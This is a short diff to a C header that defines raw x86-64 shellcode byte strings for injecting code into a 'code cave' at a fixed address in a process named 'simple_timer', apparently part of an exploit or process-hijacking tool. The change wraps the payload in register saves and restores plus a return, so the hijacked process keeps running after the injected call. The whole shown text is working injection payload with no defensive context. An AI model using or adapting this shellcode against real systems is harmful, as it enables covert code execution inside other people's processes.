@@ -26,8 +26,9 @@
 #define TASK_COMM_NAME_ROP_TARGET "simple_timer"
 #define CODE_CAVE_ADDRESS_STATIC 0x0000000000402e95
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_1 \
-"\xbf\x00\x20\x00\x00\x48\xbb"
-#define CODE_CAVE_SHELLCODE_ASSEMBLE_1_LEN 7
+"\x55\x50\x51\x52\x53\x57\x56\
+\xbf\x00\x20\x00\x00\x48\xbb"
+#define CODE_CAVE_SHELLCODE_ASSEMBLE_1_LEN 14
 
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_2 \
 "\xff\xd3\x48\x89\xc3\xc7\x00\x2f\x68\x6f\x6d\
@@ -41,9 +42,11 @@
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_2_LEN 90
 
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_3 \
-"\xbe\x01\x00\x00\x00\x48\x89\xdf\x48\x89\xdc\
-\x48\x81\xc4\x00\x10\x00\x00\x48\x89\xe5\xff\xd0" 
-#define CODE_CAVE_SHELLCODE_ASSEMBLE_3_LEN 23
+"\xbe\x01\x00\x00\x00\x48\x89\xdf\
+\x48\x81\xec\x00\x10\x00\x00\xff\
+\xd0\x48\x81\xc4\x00\x10\x00\x00\x5e\
+\x5f\x5b\x5a\x59\x58\x5d\xc3"
+#define CODE_CAVE_SHELLCODE_ASSEMBLE_3_LEN 32
 
 
 #endif
